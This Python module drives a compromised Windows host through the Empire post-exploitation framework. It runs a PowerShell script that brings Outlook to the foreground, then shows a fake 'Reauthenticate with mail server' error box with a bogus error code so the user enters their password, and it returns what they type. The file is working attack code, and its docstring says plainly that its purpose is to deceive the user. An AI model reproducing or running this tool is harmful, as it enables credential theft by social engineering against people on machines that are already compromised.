"""
Brings Outlook foreground & prompts for credentials to deceive user
"""
from EmpireAPIWrapper import empireAPI
from empire_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
from autocomplete.empire import collection, management

def run(API, agent_name):
    """
    Returns user credentials
    :param API: EmpireAPIWrapper object
    :param agent_name: name of agent
    :return type: str or None
    """

    # Step 1 - Bring outlook foreground
    script_path = "/tmp/showoutlook.ps1"
    show_outlook_PSH_script = """Function ShowOutlook { 
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class SFW {

            [DllImport("user32.dll")]
            public static extern int ShowWindow(int hwnd, int nCmdShow);

        }
"@  #DO NOT add tab to this line

        $h =  (get-process OUTLOOK).MainWindowHandle
        if($h) { # bring foreground
            [SFW]::ShowWindow($h, 3)
        }
        else { # start a new process
            start Outlook
        }
    }"""
    with open(script_path, "w") as text_file:
        text_file.write(show_outlook_PSH_script)
    
    options = management.invoke_script.options
    params = {
                options.required_agent: agent_name,
                options.scriptpath: script_path,
                options.required_scriptcmd: 'ShowOutlook'
    }
    API.module_exec(management.invoke_script.path, params)
    # Step 2 - Prompt for Credentials
    options = collection.prompt.options
    params = {
                options.required_agent: agent_name,
                options.required_icontype: 'Exclamation',
                options.required_msgtext: 'Reauthenticate with mail server',
                options.required_title: 'ERROR - 0x8000CCC18'
            }
    return API.module_exec_with_result(collection.prompt.path, params, agent_name)


if __name__ == '__main__': # unit test
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    print(run(API, API.agents()['agents'][0]['name']))